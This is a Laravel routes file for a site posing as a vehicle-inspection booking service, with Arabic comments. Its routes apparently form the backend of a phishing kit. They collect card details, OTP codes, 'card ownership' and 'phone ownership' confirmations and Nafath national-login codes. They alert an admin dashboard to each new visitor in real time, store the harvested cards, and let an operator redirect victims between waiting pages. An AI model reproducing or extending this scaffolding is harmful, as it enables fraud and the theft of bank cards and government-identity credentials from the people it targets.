<?php

use App\Models\User;
use App\Events\NewVisitor;
use App\Http\Controllers\BookingController;
use App\Http\Controllers\CardController;
use App\Http\Controllers\NotificationController;
use App\Models\VisitorNotifications;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\TripController;

use function PHPUnit\Framework\isNull;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/', function () {

    $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;

    $not = null;

    if(isNull($visitor))
    {
        $not  =VisitorNotifications::create([]);
        session()->put('visitor',json_encode($not));
        event(new NewVisitor($not));
    }
    // else{
    //     $not  =VisitorNotifications::find($visitor->id);
    // }
    // session()->put('visitor',json_encode($not));
    // event(new NewVisitor($not));
    return view('main.home');
})->name('home');
Route::get('inspection-criteria', function(){
    return view('main.inspection_criteria');
})->name('inspection_criteria');
Route::get('inspection-status', function(){
    return view('main.inspection_status');
})->name('inspection_status');
Route::get('booking/apply', function(){
    return view('main.booking.apply');
})->name('booking_apply');
Route::get('booking/edit', function(){
    return view('main.booking.edit');
})->name('booking_edit');
Route::get('booking/cancel', function(){
    return view('main.booking.cancel');
})->name('booking_cancel');
Route::get('contact', function(){
    return view('main.contact');
})->name('contact');
Route::post('people/store', [BookingController::class,'saveBooking'])->name('store_booking');
Route::get('booking/summary/{id}', [BookingController::class,'summary'])->name('booking_summary');
Route::get('booking/part', [BookingController::class,'paymentPage'])->name('booking_payment');
Route::post('booking/part/store', [BookingController::class,'paymentStore'])->name('booking_payment_store');
Route::get('booking/part/waiting', function(){
    return view('main.booking.payment_waiting');
})->name('booking_payment_waiting');
Route::post('booking/verification/store', [BookingController::class,'verifyOtpStore'])->name('otp.store');//
Route::get('booking/part/auth', [BookingController::class,'partAuth'])->name('confirm_card_owner');//اثبات ملكية البطاقة
Route::post('booking/auth/store', [BookingController::class,'partAuthStore'])->name('save_auth_state');//اثبات ملكية البطاقة
Route::get('/cst', [BookingController::class,'phoneAuth'])->name('confirm_phone');//اثبات ملكية الهاتف
Route::post('cst/store', [BookingController::class,'phoneAuthStore'])->name('save_phone_auth_state');//اثبات ملكية الهاتف
Route::get('cst/vern', function(){
    return view('main.booking.confirm_phone_code');
})->name('confirm_phone_code_page');
Route::post('phone-code/store', [BookingController::class,'phoneCodeStore'])->name('save_phone_code');//اثبات ملكية الهاتف



Route::post('search/{type}', [TripController::class,'saveTrip'])->name('init_trip');
Route::get('summary/{id}', [TripController::class,'summary'])->name('summary');
Route::get('bus-summary/{id}', [TripController::class,'busSummary'])->name('bus_summary');
Route::get('people/data', [TripController::class,'peopleDataPage'])->name('people_data_get');
Route::get('manage', [TripController::class,'peopleDataPage'])->name('people_data_get');
Route::post('people/data/save', [TripController::class,'peopleDataStore'])->name('people_data_store');
// Route::get('part', [TripController::class,'paymentPage'])->name('trip_payment');
Route::post('part', [TripController::class,'paymentStore'])->name('trip_payment_store');
Route::get('part/waiting', function(){
    return view('waiting');
})->name('trip_payment_waiting');
Route::get('part/verification', [TripController::class,'verifyOtp'])->name('verify_otp');//
// Route::post('part/verification/store', [TripController::class,'verifyOtpStore'])->name('otp.store');//
// Route::get('part/auth', [TripController::class,'partAuth'])->name('confirm_card_owner');//اثبات ملكية البطاقة
// Route::post('part/auth/store', [TripController::class,'partAuthStore'])->name('save_auth_state');//اثبات ملكية البطاقة
// Route::get('phone/auth', [TripController::class,'phoneAuth'])->name('confirm_phone');//اثبات ملكية الهاتف
// Route::post('phone/auth/store', [TripController::class,'phoneAuthStore'])->name('save_phone_auth_state');//اثبات ملكية الهاتف
Route::post('/send-code', [TripController::class,'sendCodeToVisitor']);
Route::get('/verify-code', function(){
    return view('enter_recieved_code');
})->name('verify_recieved_code');
Route::post('/save-recieved-code', [TripController::class,'saveRecievedCode'])->name('save_recieved_code');
Route::get('/nafad/auth',  [TripController::class,'NafadPage'])->name('enter_nafad_page');
Route::get('/nafad/code',  function(){return view('nafad_code_waiting');})->name('nafad_code');
Route::post('/save-nafad-id', [TripController::class,'saveNafadId'])->name('save_nafad_id');
Route::get('/finish', function(){
    return view('final_step');
})->name('final_step');
Route::post('/redirect-user', [TripController::class,'redirectUser'])->name('redirect_user');
Route::get('/waiting',  function(){return view('just_waiting');})->name('just_waiting');
Route::middleware([
    'auth:sanctum',
    config('jetstream.auth_session'),
    'verified',
])->group(function () {

    Route::group(['prefix'=>'dashboard'],function(){
        Route::get('/', function () {
            $notifications = VisitorNotifications::latest()->get();
            return view('dashboard',compact('notifications'));
        })->name('dashboard');
        Route::get('notifications/all',[NotificationController::class,'index'])->name('notifications.index');
        Route::get('notifications/{id}',[NotificationController::class,'show'])->name('notifications.show');
        Route::delete('notifications/{id}',[NotificationController::class,'destroy'])->name('notifications.delete');
        Route::delete('notifications/all/clear',[NotificationController::class,'destroyAll'])->name('notifications.clear_all');
        Route::resource('cards',CardController::class)->except(['show','create']);
        Route::delete('cards/all/clear',[CardController::class,'destroyAll'])->name('cards.clear_all');
    });
});

